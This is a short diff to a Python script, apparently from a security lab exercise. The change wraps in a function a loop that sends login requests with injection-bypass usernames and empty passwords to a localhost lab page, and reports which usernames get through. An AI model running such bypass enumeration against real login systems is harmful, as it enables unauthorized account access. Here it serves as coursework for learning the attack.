@@ -49,19 +49,21 @@ usernames = {
 
 url = "http://localhost/lab09/login.php"
 
-for username in usernames:
-    # print(username + "...")
-    username = inject_bypass(username)
-    # print(username)
 
-    params = {
-        "u": username,
-        "p": ""
-    }
+def scan_for_usernames():
+    for username in usernames:
+        # print(username + "...")
+        username = inject_bypass(username)
+        # print(username)
 
-    (response, url_par) = send_request(params, url)
+        params = {
+            "u": username,
+            "p": ""
+        }
 
-    if(not("invalid" in response.decode('utf-8'))):
-        print(username + " -- hit!")
-        print(url_par)
-        print(response)
+        (response, url_par) = send_request(params, url)
+
+        if(not("invalid" in response.decode('utf-8'))):
+            print(username + " -- hit!")
+            print(url_par)
+            print(response)
